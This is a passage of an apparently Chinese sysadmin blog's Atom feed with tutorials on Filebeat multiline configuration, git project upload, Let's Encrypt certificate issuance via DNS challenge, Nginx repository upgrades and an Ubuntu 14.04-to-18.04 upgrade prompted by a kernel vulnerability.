    <summary type="html">&lt;h2 id=&quot;一、缘由：&quot;&gt;&lt;a href=&quot;#一、缘由：&quot; class=&quot;headerlink&quot; title=&quot;一、缘由：&quot;&gt;&lt;/a&gt;一、缘由：&lt;/h2&gt;&lt;p&gt;ELK中，如果是你使用Logstash做日志收集Agent，那么默认索引为logstash-&lt;em&gt;；如果你使用Fi</summary>
      
    
    
    
    <category term="工具" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="ELK" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/ELK/"/>
    
    
    <category term="ELK" scheme="https://www.langxw.com/tags/ELK/"/>
    
    <category term="index" scheme="https://www.langxw.com/tags/index/"/>
    
    <category term="log" scheme="https://www.langxw.com/tags/log/"/>
    
  </entry>
  
  <entry>
    <title>Filebeat合并多行日志</title>
    <link href="https://www.langxw.com/2021/02/02/Filebeat%E5%90%88%E5%B9%B6%E5%A4%9A%E8%A1%8C%E6%97%A5%E5%BF%97/"/>
    <id>https://www.langxw.com/2021/02/02/Filebeat%E5%90%88%E5%B9%B6%E5%A4%9A%E8%A1%8C%E6%97%A5%E5%BF%97/</id>
    <published>2021-02-02T02:23:55.000Z</published>
    <updated>2021-02-02T02:25:55.605Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、配置解释："><a href="#一、配置解释：" class="headerlink" title="一、配置解释："></a>一、配置解释：</h2><p>在filebeat.yml的filebeat.inputs中，有关于多行日志合并的配置：</p><pre><code class="yaml">multiline.pattern # 指定正则表达式去匹配指定的行，例如multiline.pattern: &#39;^\[&#39;，意思是去匹配以[开头的行multiline.negate # 定义pattern是否被否认，默认值是false，若为true，意思是对上面的匹配进行反转(就是实际去匹配不以pattern的行)multiline.match # 指定Filebeat如何合并匹配的行，有两个值after和before# 如果negate设置为false，match设置为after，Filebeat就会把不匹配的行作为行首，把匹配的行插入到行首后。# 如果negate设置为true，match设置为after，Filebeat就会把匹配的行作为行首，把不匹配的行插入到行首后。multiline.flush_pattern # 指定正则表达式去匹配指定的行作为multline-message的结束，刷新的内存，开始匹配新的多行multiline.max_lines # 指定合并最大行数multiline.timeout  # 设定一个超时时间，在时间结束后，即使没有匹配到新pattern来启动新事件，Filebeat也会发送多行事件。默认值是5秒</code></pre><h2 id="二、我司示例："><a href="#二、我司示例：" class="headerlink" title="二、我司示例："></a>二、我司示例：</h2><p>观察到我司日志每一条都是以时间日期开头，后面日志内容会有换行，行首还有空格，还会有java堆栈报错，经实践采用以下配置：</p><pre><code class="shell">  multiline.pattern: &#39;^\[[0-9]&#123;4&#125;-[0-9]&#123;2&#125;-[0-9]&#123;2&#125;&#39;  multiline.negate: true  multiline.match: after</code></pre><p>上面配置的意思是：不以时间格式（[2019-06-06）开头的行都合并到上一行的末尾。</p><p>注意：<strong>日志格式要统一</strong></p><h2 id="三、其他示例："><a href="#三、其他示例：" class="headerlink" title="三、其他示例："></a>三、其他示例：</h2><p>来自官方文档翻译：</p><h3 id="1、Java堆栈跟踪"><a href="#1、Java堆栈跟踪" class="headerlink" title="1、Java堆栈跟踪"></a>1、Java堆栈跟踪</h3><h4 id="1）Java示例一"><a href="#1）Java示例一" class="headerlink" title="1）Java示例一"></a>1）Java示例一</h4><p>Java堆栈跟踪由多行组成，每一行在初始行之后以空格开头，如本例中所述:</p><pre><code>Exception in thread &quot;main&quot; java.lang.NullPointerException        at com.example.myproject.Book.getTitle(Book.java:16)        at com.example.myproject.Author.getBookTitles(Author.java:25)        at com.example.myproject.Bootstrap.main(Bootstrap.java:14)</code></pre><p>要将这些行整合到Filebeat中的单个事件中，请使用以下多行配置：</p><pre><code class="yaml">multiline.pattern: &#39;^[[:space:]]&#39;multiline.negate: falsemultiline.match: after</code></pre><p>此配置将以空格开头的所有行合并到上一行。</p><h4 id="2）Java示例二"><a href="#2）Java示例二" class="headerlink" title="2）Java示例二"></a>2）Java示例二</h4><p>下面是一个Java堆栈跟踪日志，稍微复杂的例子：</p><pre><code>Exception in thread &quot;main&quot; java.lang.IllegalStateException: A book has a null property       at com.example.myproject.Author.getBookIds(Author.java:38)       at com.example.myproject.Bootstrap.main(Bootstrap.java:14)Caused by: java.lang.NullPointerException       at com.example.myproject.Book.getId(Book.java:22)       at com.example.myproject.Author.getBookIds(Author.java:35)       ... 1 more</code></pre><p>要将这些行整合到Filebeat中的单个事件中，请使用以下多行配置：</p><pre><code class="yaml">multiline.pattern: &#39;^[[:space:]]+(at|\.&#123;3&#125;)\b|^Caused by:&#39;multiline.negate: falsemultiline.match: after</code></pre><p>此配置解释如下：</p><ul><li>将以空格开头的所有行合并到上一行</li><li>并把以Caused by开头的也追加到上一行</li></ul><h3 id="2、C风格的日志"><a href="#2、C风格的日志" class="headerlink" title="2、C风格的日志"></a>2、C风格的日志</h3><p>一些编程语言在一行末尾使用反斜杠()字符，表示该行仍在继续，如本例中所示:</p><pre><code>printf (&quot;%10.10ld  \t %10.10ld \t %s\  %f&quot;, w, x, y, z );</code></pre><p>要将这些行整合到Filebeat中的单个事件中，请使用以下多行配置：</p><pre><code class="yaml">multiline.pattern: &#39;\\$&#39;multiline.negate: falsemultiline.match: before</code></pre><p>此配置将以\字符结尾的任何行与后面的行合并。</p><h3 id="3、时间戳"><a href="#3、时间戳" class="headerlink" title="3、时间戳"></a>3、时间戳</h3><p>来自Elasticsearch等服务的活动日志通常以时间戳开始，然后是关于特定活动的信息，如下例所示：</p><pre><code>[2015-08-24 11:49:14,389][INFO ][env                      ] [Letha] using [1] data paths, mounts [[/(/dev/disk1)]], net usable_space [34.5gb], net total_space [118.9gb], types [hfs]</code></pre><p>要将这些行整合到Filebeat中的单个事件中，请使用以下多行配置：</p><pre><code class="yaml">multiline.pattern: &#39;^\[[0-9]&#123;4&#125;-[0-9]&#123;2&#125;-[0-9]&#123;2&#125;&#39;multiline.negate: truemultiline.match: after</code></pre><p>此配置使用<code>negate: true</code>和<code>match: after</code>设置来指定任何不符合指定模式的行都属于上一行。</p><h3 id="4、应用程序事件"><a href="#4、应用程序事件" class="headerlink" title="4、应用程序事件"></a>4、应用程序事件</h3><p>有时您的应用程序日志包含以自定义标记开始和结束的事件，如以下示例：</p><pre><code>[2015-08-24 11:49:14,389] Start new event[2015-08-24 11:49:14,395] Content of processing something[2015-08-24 11:49:14,399] End event</code></pre><p>要在Filebeat中将其整合为单个事件，请使用以下多行配置：</p><pre><code class="yaml">multiline.pattern: &#39;Start new event&#39;multiline.negate: truemultiline.match: aftermultiline.flush_pattern: &#39;End event&#39;</code></pre><p>此配置把指定字符串开头，指定字符串结尾的多行合并为一个事件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、配置解释：&quot;&gt;&lt;a href=&quot;#一、配置解释：&quot; class=&quot;headerlink&quot; title=&quot;一、配置解释：&quot;&gt;&lt;/a&gt;一、配置解释：&lt;/h2&gt;&lt;p&gt;在filebeat.yml的filebeat.inputs中，有关于多行日志合并的配置：&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="工具" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="ELK" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/ELK/"/>
    
    
    <category term="ELK" scheme="https://www.langxw.com/tags/ELK/"/>
    
    <category term="filebeat" scheme="https://www.langxw.com/tags/filebeat/"/>
    
  </entry>
  
  <entry>
    <title>Git上传本地项目</title>
    <link href="https://www.langxw.com/2021/02/02/Git%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/"/>
    <id>https://www.langxw.com/2021/02/02/Git%E4%B8%8A%E4%BC%A0%E6%9C%AC%E5%9C%B0%E9%A1%B9%E7%9B%AE/</id>
    <published>2021-02-02T02:21:35.000Z</published>
    <updated>2021-02-02T02:23:08.699Z</updated>
    
    <content type="html"><![CDATA[<p><strong>目的：本地已有项目，想上传到Github。</strong></p><h2 id="一、Github-Desktop-客户端"><a href="#一、Github-Desktop-客户端" class="headerlink" title="一、Github Desktop 客户端"></a>一、Github Desktop 客户端</h2><p>不习惯命令行的用户，可以使用Github GUI来操作。</p><h2 id="二、Git-clone-命令"><a href="#二、Git-clone-命令" class="headerlink" title="二、Git clone 命令"></a>二、Git clone 命令</h2><h3 id="1、Github新建Project："><a href="#1、Github新建Project：" class="headerlink" title="1、Github新建Project："></a>1、Github新建Project：</h3><p>新建Project，设置.gitignore文件后，得到git project地址:<code>https://github.com/langlangago/alex_blog.git</code></p><h3 id="2、本地执行git-clone："><a href="#2、本地执行git-clone：" class="headerlink" title="2、本地执行git clone："></a>2、本地执行git clone：</h3><p>在本地目录中，执行git clone 命令，下载远端project：<code>git clone https://github.com/langlangago/alex_blog.git</code>。</p><p>之后，将本地项目的文件移动到git clone 目录alex_blog下。</p><h3 id="3、将本地文件上传："><a href="#3、将本地文件上传：" class="headerlink" title="3、将本地文件上传："></a>3、将本地文件上传：</h3><p>在alex_blog目录下，将新加入文件上传到远端：</p><pre><code class="bash">git add -Agit commit -m &quot;init&quot;git push origin master</code></pre><h2 id="三、初始化本地已有项目init"><a href="#三、初始化本地已有项目init" class="headerlink" title="三、初始化本地已有项目init"></a>三、初始化本地已有项目init</h2><h3 id="1、Github新建Project：-1"><a href="#1、Github新建Project：-1" class="headerlink" title="1、Github新建Project："></a>1、Github新建Project：</h3><p>同上。</p><h3 id="2、在本地项目根目录执行git-init命令："><a href="#2、在本地项目根目录执行git-init命令：" class="headerlink" title="2、在本地项目根目录执行git init命令："></a>2、在本地项目根目录执行git init命令：</h3><p><code>git init</code></p><h3 id="3、关联远程仓库："><a href="#3、关联远程仓库：" class="headerlink" title="3、关联远程仓库："></a>3、关联远程仓库：</h3><p><code>git remote add origin https://github.com/langlangago/alex_blog.git</code></p><h3 id="4、从远程分支拉取master分支并与本地master分支合并："><a href="#4、从远程分支拉取master分支并与本地master分支合并：" class="headerlink" title="4、从远程分支拉取master分支并与本地master分支合并："></a>4、从远程分支拉取master分支并与本地master分支合并：</h3><p><code>git pull origin master:master</code></p><h3 id="5、提交本地分支到远程分支："><a href="#5、提交本地分支到远程分支：" class="headerlink" title="5、提交本地分支到远程分支："></a>5、提交本地分支到远程分支：</h3><p><code>git push -u origin master</code></p><h3 id="6、将现有项目添加并提交上传："><a href="#6、将现有项目添加并提交上传：" class="headerlink" title="6、将现有项目添加并提交上传："></a>6、将现有项目添加并提交上传：</h3><pre><code class="bash">git add -Agit commit -m &quot;init&quot;git push --set-upstream origin master</code></pre><h2 id="四、Git命令说明："><a href="#四、Git命令说明：" class="headerlink" title="四、Git命令说明："></a>四、Git命令说明：</h2><h3 id="1、git-pull"><a href="#1、git-pull" class="headerlink" title="1、git pull"></a>1、git pull</h3><p>git pull命令的作用是，取回远程主机某个分支的更新，再与本地的指定分支合并。它的完整格式稍稍有点复杂。</p><pre><code class="bash">$ git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;比如，取回origin主机的next分支，与本地的master分支合并，需要写成下面这样。$ git pull origin next:master如果远程分支是与当前分支合并，则冒号后面的部分可以省略。$ git pull origin next</code></pre><h3 id="2、git-clone"><a href="#2、git-clone" class="headerlink" title="2、git clone"></a>2、git clone</h3><p>git克隆基本上是一个组合： </p><pre><code class="bash">git init(创建本地存储库)git remote add(将URL添加到该存储库)git fetch(从该URL中获取所有分支到本地存储库)git checkout(创建工作树中主分支的所有文件)</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;目的：本地已有项目，想上传到Github。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;一、Github-Desktop-客户端&quot;&gt;&lt;a href=&quot;#一、Github-Desktop-客户端&quot; class=&quot;headerlink&quot; title=&quot;一、Gith</summary>
      
    
    
    
    <category term="工具" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="Git" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/Git/"/>
    
    
    <category term="git" scheme="https://www.langxw.com/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Lets-encrypt免费SSL证书申请</title>
    <link href="https://www.langxw.com/2021/02/02/Lets-encrypt%E5%85%8D%E8%B4%B9SSL%E8%AF%81%E4%B9%A6%E7%94%B3%E8%AF%B7/"/>
    <id>https://www.langxw.com/2021/02/02/Lets-encrypt%E5%85%8D%E8%B4%B9SSL%E8%AF%81%E4%B9%A6%E7%94%B3%E8%AF%B7/</id>
    <published>2021-02-02T02:18:38.000Z</published>
    <updated>2021-03-16T11:59:58.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、环境准备："><a href="#一、环境准备：" class="headerlink" title="一、环境准备："></a>一、环境准备：</h2><ol><li>建议Debain操作系统，比如Ubuntu</li><li>Python 2.7以及以上版本</li><li>git</li><li>pip源修改：~/.pip/pip.conf（选做）</li></ol><h2 id="二、获取SSL证书："><a href="#二、获取SSL证书：" class="headerlink" title="二、获取SSL证书："></a>二、获取SSL证书：</h2><pre><code class="bash">git clone https://github.com/letsencrypt/letsencrypt  cd letsencrypt  sudo ./letsencrypt-auto certonly --manual --preferred-challenges dns --email 1282148721@qq.com -d fangxinpei.cn -d www.fangxinpei.cn</code></pre><p>生成证书时，验证的方法有很多。这里我们用手动指定DNS验证的方法。</p><p>介绍下相关参数：</p><ul><li>certonly，表示安装模式，Certbot 有安装模式和验证模式两种类型的插件。</li><li>–manual  表示手动安装插件，Certbot 有很多插件，不同的插件都可以申请证书，用户可以根据需要自行选择</li><li>-d 为那些主机申请证书，如果是通配符，输入 *.newyingyong.cn（可以替换为你自己的域名）</li><li>–preferred-challenges dns，使用 DNS 方式校验域名所有权</li></ul><pre><code class="bash">Saving debug log to /var/log/letsencrypt/letsencrypt.logPlugins selected: Authenticator manual, Installer NoneEnter email address (used for urgent renewal and security notices) (Enter &#39;c&#39; tocancel): ywdblog@gmail.com-------------------------------------------------------------------------------Please read the Terms of Service athttps://letsencrypt.org/documents/LE-SA-v1.2-November-15-2017.pdf. You mustagree in order to register with the ACME server athttps://acme-v02.api.letsencrypt.org/directory-------------------------------------------------------------------------------(A)gree/(C)ancel: APlugins selected: Authenticator manual, Installer NoneObtaining a new certificatePerforming the following challenges:dns-01 challenge for newyingyong.cn-------------------------------------------------------------------------------NOTE: The IP of this machine will be publicly logged as having requested thiscertificate. If you&#39;re running certbot in manual mode on a machine that is notyour server, please ensure you&#39;re okay with that.Are you OK with your IP being logged?-------------------------------------------------------------------------------(Y)es/(N)o: y</code></pre><p>上述有两个交互式的提示：</p><ul><li>是否同意 Let’s Encrypt 协议要求</li><li>询问是否对域名和机器（IP）进行绑定</li></ul><p>确认同意才能继续。</p><p>继续查看命令行的输出，非常关键</p><pre><code class="bash">-------------------------------------------------------------------------------Please deploy a DNS TXT record under the name_acme-challenge.newyingyong.cn with the following value:2_8KBE_jXH8nYZ2unEViIbW52LhIqxkg6i9mcwsRvhQBefore continuing, verify the record is deployed.-------------------------------------------------------------------------------Press Enter to ContinueWaiting for verification...Cleaning up challenges </code></pre><p>要求配置 DNS TXT 记录，从而校验域名所有权，也就是判断证书申请者是否有域名的所有权。</p><p>上面输出要求给 _acme-challenge.fangxinpei.cn 配置一条 TXT 记录，在没有确认 TXT 记录生效之前不要回车执行。</p><p>在阿里云操作DNS解析后，输入以下命令，查看TXT记录是否已经生效：</p><pre><code class="bash">$ dig  -t txt  _acme-challenge.fangxinpei.cn @8.8.8.8    ;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 512;; QUESTION SECTION:;_acme-challenge.fangxinpei.cn.        IN      TXT;; ANSWER SECTION:_acme-challenge.fangxinpei.cn.cn. 599 IN  TXT    &quot;2_8KBE_jXH8nYZ2unEViIbW52LhIqxkg6i9mcwsRvhQ&quot;</code></pre><p>确认生效后，回车执行，输出如下：</p><pre><code class="bash">IMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at:   /etc/letsencrypt/live/fangxinpei.cn/fullchain.pem   Your key file has been saved at:   /etc/letsencrypt/live/fangxinpei.cn/privkey.pem   Your cert will expire on 2019-06-09. To obtain a new or tweaked   version of this certificate in the future, simply run   letsencrypt-auto again. To non-interactively renew *all* of your   certificates, run &quot;letsencrypt-auto renew&quot; - If you like Certbot, please consider supporting our work by:   Donating to ISRG / Let&#39;s Encrypt:   https://letsencrypt.org/donate   Donating to EFF:                    https://eff.org/donate-le</code></pre><p>恭喜您，证书申请成功，证书和密钥保存在下列目录：</p><pre><code class="bash">$ tree /etc/letsencrypt/archive/fangxinpei.cn .├── cert1.pem├── chain1.pem├── fullchain1.pem└── privkey1.pem</code></pre><p>然后校验证书信息，输入如下命令：</p><pre><code class="bash">sudo openssl x509 -in  /etc/letsencrypt/archive/fangxinpei.cn/cert1.pem -noout -text </code></pre><p>关键输出如下：</p><pre><code class="bash">            X509v3 Subject Alternative Name:                 DNS:fangxinpei.cn, DNS:www.fangxinpei.cn</code></pre><p><strong>其他生成证书方式：</strong></p><pre><code class="bash">./certbot certonly --webroot -w /usr/share/nginx/html -d ubock.com -d www.ubock.com</code></pre><pre><code class="bash">./letsencrypt-auto certonly --standalone --email xxxxx@qq.com -d fangxinpei.cn -d www.fangxinpei.cn</code></pre><p>以上两种方式坑略多，不建议这么操作。</p><h2 id="三、证书的应用："><a href="#三、证书的应用：" class="headerlink" title="三、证书的应用："></a>三、证书的应用：</h2><p>在完成Let’s Encrypt证书的生成之后，我们会在”/etc/letsencrypt/live/zhaoheqiang.me/“域名目录下有4个文件就是生成的密钥证书文件(软连接)。</p><p>cert.pem  - Apache服务器端证书<br> chain.pem  - Apache根证书和中继证书<br> fullchain.pem  - Nginx所需要ssl_certificate文件<br> privkey.pem - 安全证书KEY文件</p><p>如果我们使用的Nginx环境，那就需要用到fullchain.pem和privkey.pem两个证书文件，在部署Nginx的时候需要用到。在Nginx环境中，只要将对应的ssl_certificate和ssl_certificate_key路径设置成我们生成的2个文件就可以</p><pre><code class="bash">#打开linux配置文件，找到HTTPS 443端口配置的server ssl_certificate /etc/letsencrypt/live/zhaoheqiang.me/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/zhaoheqiang.me/privkey.pem</code></pre><h2 id="四、证书续期的问题："><a href="#四、证书续期的问题：" class="headerlink" title="四、证书续期的问题："></a>四、证书续期的问题：</h2><p>Let’s Encrypt证书是有效期90天的，需要我们自己手工更新续期才可以。</p><pre><code class="bash"> ./letsencrypt-auto certonly --renew-by-default --email quiniton@163.com -d zhaoheqiang.me -d www.zhaoheqiang.me</code></pre><p>这样我们在90天内再去执行一次就可以解决续期问题，这样又可以继续使用90天。如果我们怕忘记的话也可以利用linux crontab定时执行更新任务</p><pre><code class="bash">30 4 * * 1 certbot renew --renew-hook &quot;systemctl restart nginx&quot; --quiet &gt; /dev/null 2&gt;&amp;1 &amp;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、环境准备：&quot;&gt;&lt;a href=&quot;#一、环境准备：&quot; class=&quot;headerlink&quot; title=&quot;一、环境准备：&quot;&gt;&lt;/a&gt;一、环境准备：&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;建议Debain操作系统，比如Ubuntu&lt;/li&gt;
&lt;li&gt;Python 2.7以及以</summary>
      
    
    
    
    <category term="工具" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="免费证书" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/%E5%85%8D%E8%B4%B9%E8%AF%81%E4%B9%A6/"/>
    
    
    <category term="lets-encrypt" scheme="https://www.langxw.com/tags/lets-encrypt/"/>
    
    <category term="ssl证书" scheme="https://www.langxw.com/tags/ssl%E8%AF%81%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>Nginx利用源升级</title>
    <link href="https://www.langxw.com/2021/02/02/Nginx%E5%88%A9%E7%94%A8%E6%BA%90%E5%8D%87%E7%BA%A7/"/>
    <id>https://www.langxw.com/2021/02/02/Nginx%E5%88%A9%E7%94%A8%E6%BA%90%E5%8D%87%E7%BA%A7/</id>
    <published>2021-02-02T02:16:55.000Z</published>
    <updated>2021-02-02T02:18:00.392Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二、升级步骤"><a href="#二、升级步骤" class="headerlink" title="二、升级步骤"></a>二、升级步骤</h2><h3 id="1-先添加源信任签名文件"><a href="#1-先添加源信任签名文件" class="headerlink" title="1 . 先添加源信任签名文件"></a>1 . 先添加源信任签名文件</h3><pre><code class="bash">wget http://nginx.org/keys/nginx_signing.keysudo apt-key add nginx_signing.key</code></pre><h3 id="2-编辑-etc-apt-sources-list-在最后加入"><a href="#2-编辑-etc-apt-sources-list-在最后加入" class="headerlink" title="2 . 编辑 /etc/apt/sources.list 在最后加入"></a>2 . 编辑 /etc/apt/sources.list 在最后加入</h3><pre><code class="bash">deb http://nginx.org/packages/ubuntu/ trusty nginxdeb-src http://nginx.org/packages/ubuntu/ trusty nginx</code></pre><p>其中，这个没有包含 mainline 的地址是稳定版（推荐用稳定版，当然加上 mainline 保持最新也无所谓）；</p><p>trusty 是 Ubuntu 14.04 的代号，其他版本或者系统就要自己去<a href="http://nginx.org/en/linux_packages.html#stable">http://nginx.org/en/linux_packages.html#stable</a> 看了</p><h3 id="3-可以安装了"><a href="#3-可以安装了" class="headerlink" title="3 . 可以安装了"></a>3 . 可以安装了</h3><pre><code class="bash">sudo apt-get updatesudo apt-get clean &amp;&amp; sudo apt-get install nginx</code></pre><h3 id="4-如果再次按照遇到这个错误"><a href="#4-如果再次按照遇到这个错误" class="headerlink" title="4 . 如果再次按照遇到这个错误"></a>4 . 如果再次按照遇到这个错误</h3><pre><code class="bash">Unpacking nginx (1.10.2-1~trusty) over (1.4.6-1ubuntu3.7) ...dpkg: error processing archive /var/cache/apt/archives/nginx_1.10.2-1~trusty_amd64.deb (--unpack): trying to overwrite &#39;/etc/default/nginx&#39;, which is also in package nginx-common 1.4.6-1ubuntu3.7dpkg-deb: error: subprocess paste was killed by signal (Broken pipe)</code></pre><p>可以先删除之前的版本再安装，删除之前注意备份 /etc/nginx/ 下的配置文件</p><pre><code class="bash">sudo apt-get purge nginx nginx-commonsudo apt-get clean &amp;&amp; sudo apt-get install nginx</code></pre><h3 id="5-最后把配置文件恢复（可以用-nginx-t-测试一下配置文件是否正确），然后就可以启动了"><a href="#5-最后把配置文件恢复（可以用-nginx-t-测试一下配置文件是否正确），然后就可以启动了" class="headerlink" title="5 . 最后把配置文件恢复（可以用 nginx -t 测试一下配置文件是否正确），然后就可以启动了"></a>5 . 最后把配置文件恢复（可以用 nginx -t 测试一下配置文件是否正确），然后就可以启动了</h3><pre><code class="bash">sudo service nginx start</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;二、升级步骤&quot;&gt;&lt;a href=&quot;#二、升级步骤&quot; class=&quot;headerlink&quot; title=&quot;二、升级步骤&quot;&gt;&lt;/a&gt;二、升级步骤&lt;/h2&gt;&lt;h3 id=&quot;1-先添加源信任签名文件&quot;&gt;&lt;a href=&quot;#1-先添加源信任签名文件&quot; class=&quot;head</summary>
      
    
    
    
    <category term="中间件" scheme="https://www.langxw.com/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
    <category term="Nginx" scheme="https://www.langxw.com/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/Nginx/"/>
    
    
    <category term="nginx" scheme="https://www.langxw.com/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu-14.04LTS升级到Ubuntu-18.04LTS</title>
    <link href="https://www.langxw.com/2021/02/02/Ubuntu-14-04LTS%E5%8D%87%E7%BA%A7%E5%88%B0Ubuntu-18-04LTS/"/>
    <id>https://www.langxw.com/2021/02/02/Ubuntu-14-04LTS%E5%8D%87%E7%BA%A7%E5%88%B0Ubuntu-18-04LTS/</id>
    <published>2021-02-02T02:14:53.000Z</published>
    <updated>2021-02-02T02:16:28.724Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、缘由："><a href="#一、缘由：" class="headerlink" title="一、缘由："></a>一、缘由：</h2><p>最近爆出了Linux内核的高危漏洞，Linux 内核TCP SACK漏洞，需要升级内核或者打补丁做修补。</p><p>但是，我司使用的是Ubuntu 14.04 TLS Server，已经过了官方支持周期，无Ubuntu14.04 LTS的内核升级方案和补丁。无奈，只能升级操作系统。</p><p>环境：<strong>Ubuntu 14.04 LTS Server</strong></p><h2 id="二、步骤："><a href="#二、步骤：" class="headerlink" title="二、步骤："></a>二、步骤：</h2><h3 id="1、升级到Ubuntu14-04-LTS的最新版本"><a href="#1、升级到Ubuntu14-04-LTS的最新版本" class="headerlink" title="1、升级到Ubuntu14.04 LTS的最新版本"></a>1、升级到Ubuntu14.04 LTS的最新版本</h3><p><strong>建议先修改APT源到国内源，节省下载时间。</strong></p><pre><code class="bash">sudo apt-get updatesudo apt-get dist-upgradesudo apt-get autoremove</code></pre><p>这些命令可以使你的Ubuntu14.04 LTS升级为最新版本，比如从Ubuntu14.04.1LTS升级到Ubutnu 14.04.6LTS</p><p>命令说明：<strong>update 更新本地软件包的索引，upgrade 根据update拿到的索引安装最近软件包；dist-upgrade 功能和upgrade一样，但是他会自动处理最新依赖关系。</strong></p><h3 id="2、升级到Ubuntu-16-04-LTS"><a href="#2、升级到Ubuntu-16-04-LTS" class="headerlink" title="2、升级到Ubuntu 16.04 LTS"></a>2、升级到Ubuntu 16.04 LTS</h3><p><code>sudo do-release-upgrade -d</code> </p><p>如果提示没有可用的升级，则加上-d参数 <code>sudo do-release-upgrade -p</code></p><h3 id="3、升级到Ubuntu-18-04-LTS"><a href="#3、升级到Ubuntu-18-04-LTS" class="headerlink" title="3、升级到Ubuntu 18.04 LTS"></a>3、升级到Ubuntu 18.04 LTS</h3><p><code>sudo do-release-upgrade -d</code> </p><p>如果提示没有可用的升级，则加上-d参数 <code>sudo do-release-upgrade -p</code></p><h3 id="4、修改DNS配置"><a href="#4、修改DNS配置" class="headerlink" title="4、修改DNS配置"></a>4、修改DNS配置</h3><p>Ubuntu 18.04 改用systemd-resolve来管理DNS，之前resolveconf -u形式的貌似失效了。</p><p><code>sudo vim /etc/systemd/resolved.conf </code></p><pre><code class="bash">[Resolve]DNS= 192.168.1.99 223.5.5.5 114.114.114.114</code></pre><p>然后重启DNS服务<code>sudo systemctl restart systemd-resolved.service </code></p><h3 id="5、修改APT源"><a href="#5、修改APT源" class="headerlink" title="5、修改APT源"></a>5、修改APT源</h3><p>鉴于ubuntu官方源比较慢，建议修改sources.list 为阿里云源。</p><p><code>cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></p><p><code>vim /etc/apt/sources.list</code></p><pre><code class="bash">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</code></pre><p>然后更新下索引 ：<code>sudo apt update &amp;&amp; sudo apt upgrade</code>  </p><h3 id="6、-设置开机启动"><a href="#6、-设置开机启动" class="headerlink" title="6、 设置开机启动"></a>6、 设置开机启动</h3><p>设置systemd管理的开机启动项目，建议使用systemclt 更清晰明了，不建议使用rc.local(毕竟已是昨日黄花)</p><h3 id="7、-观察"><a href="#7、-观察" class="headerlink" title="7、 观察"></a>7、 观察</h3><p>先在测试环境升级，待观察2周，环境稳定后，再升级正式环境。</p><h2 id="三、漏洞："><a href="#三、漏洞：" class="headerlink" title="三、漏洞："></a>三、漏洞：</h2><ol><li>漏洞的发布者发布的信息：<br><a href="https://github.com/Netflix/security-bulletins/blob/master/advisories/third-party/2019-001.md">https://github.com/Netflix/security-bulletins/blob/master/advisories/third-party/2019-001.md</a></li><li>Ubuntu官方的 更新通知：<br><a href="https://wiki.ubuntu.com/SecurityTeam/KnowledgeBase/SACKPanic">https://wiki.ubuntu.com/SecurityTeam/KnowledgeBase/SACKPanic</a></li><li>阿里云镜像网站：<a href="http://mirrors.aliyun.com/">http://mirrors.aliyun.com/</a></li></ol><h2 id="四、注意事项："><a href="#四、注意事项：" class="headerlink" title="四、注意事项："></a>四、注意事项：</h2><h3 id="1、MySQL"><a href="#1、MySQL" class="headerlink" title="1、MySQL"></a>1、MySQL</h3><p>如果是APT在线安装的MySQL，再升级完系统后会起不起来，发现没有mysql这个命令。</p><p>是因为，旧版本的MySQL已经不再被Ubuntu18.04支持，已经被抛弃，但是数据还在。</p><p>解决办法：</p><ol><li><p>安装新版本MySQL5.7 <code>apt install mysql-server</code></p></li><li><p>根据需要修改配置文件中 <code>bind-address:127.0.0.1</code>，默认绑定本地。</p></li></ol><h3 id="2、其他不监听端口的软件："><a href="#2、其他不监听端口的软件：" class="headerlink" title="2、其他不监听端口的软件："></a>2、其他不监听端口的软件：</h3><ol><li>Filebeat</li><li>Smokeping</li><li>Falcon-agent</li></ol>]]></content>
    
    
      
      
